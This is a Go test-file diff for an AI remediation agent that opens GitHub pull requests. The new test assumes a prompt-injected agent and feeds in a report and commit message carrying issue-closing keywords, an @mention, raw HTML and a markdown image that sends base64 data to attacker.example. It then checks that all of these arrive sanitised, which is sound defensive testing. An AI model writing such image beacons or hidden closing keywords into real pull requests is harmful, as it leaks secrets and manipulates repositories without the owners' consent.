@@ -5,6 +5,7 @@ package remediation
 
 import (
 	"context"
+	"strings"
 	"testing"
 	"time"
 
@@ -424,10 +425,11 @@ const fakePushedCommit = "c0ffee00c0ffee00c0ffee00c0ffee00c0ffee00"
 
 // fakeForge records pushes and PRs.
 type fakeForge struct {
-	pushed  []string // branches
-	prs     []string // branches
-	bodies  []string // PR bodies
-	prCalls int
+	pushed   []string // branches
+	messages []string // pushed commit messages
+	prs      []string // branches
+	bodies   []string // PR bodies
+	prCalls  int
 }
 
 func (f *fakeForge) Push(_ context.Context, _, _, branch string, cs *envelope.Changeset) (string, error) {
@@ -435,6 +437,7 @@ func (f *fakeForge) Push(_ context.Context, _, _, branch string, cs *envelope.Ch
 		panic("push without changeset")
 	}
 	f.pushed = append(f.pushed, branch)
+	f.messages = append(f.messages, cs.CommitMessage)
 	return fakePushedCommit, nil
 }
 
@@ -556,6 +559,44 @@ func TestRemediationSuccessPushesAndOpensPR(t *testing.T) {
 	}
 	if rem.Status.Stage == nil || rem.Status.Stage.Usage.CostUSD != "3.500000" {
 		t.Errorf("stage = %+v, want cost 3.500000", rem.Status.Stage)
+	}
+}
+
+// TestRemediationAgentTextReachesGitHubInert: the report and the commit
+// message are the agent's, and a prompt-injected agent writes them to act
+// on GitHub. The pull request body carries the report sanitised and
+// defanged: no image whose URL GitHub's proxy would fetch, no closing
+// keyword or mention, raw HTML shown literally. The pushed commit message,
+// plain text on the default branch once merged, closes and mentions nothing.
+func TestRemediationAgentTextReachesGitHubInert(t *testing.T) {
+	events := crdRemediationEvent(true)
+	events[0].Remediation.ReportMarkdown = "## Fix\n\nFixes #7, closes acme/other#8. cc @admin\n" +
+		"![x](https://attacker.example/?d=c2VjcmV0)\n<img src=x>\n"
+	events[0].Remediation.Changeset.CommitMessage = "fix: escape\n\nFixes #7 and closes acme/other#8 for @admin\n"
+	runner := &fakeCRRunner{done: true, events: events}
+	fw := &fakeForge{}
+	r, _ := newRemediation(t, runner, fw, runningRemediation()...)
+	remOnce(t, r, "finding-aa-1-rem-1")
+
+	if len(fw.bodies) != 1 || len(fw.messages) != 1 {
+		t.Fatalf("bodies = %d, messages = %d, want one each", len(fw.bodies), len(fw.messages))
+	}
+	_, report, _ := strings.Cut(fw.bodies[0], "## Fix")
+	for _, raw := range []string{"Fixes #7", "acme/other#8", "@admin", "\n![x](", "\n<img"} {
+		if strings.Contains(report, raw) {
+			t.Errorf("pull request body keeps %q raw:\n%s", raw, fw.bodies[0])
+		}
+	}
+	if !strings.Contains(report, "attacker.example") {
+		t.Errorf("pull request body does not show the report:\n%s", fw.bodies[0])
+	}
+	for _, raw := range []string{"#7", "#8", "@admin"} {
+		if strings.Contains(fw.messages[0], raw) {
+			t.Errorf("commit message keeps %q:\n%s", raw, fw.messages[0])
+		}
+	}
+	if !strings.HasPrefix(fw.messages[0], "fix: escape\n") {
+		t.Errorf("commit message lost the agent's subject: %q", fw.messages[0])
 	}
 }
 
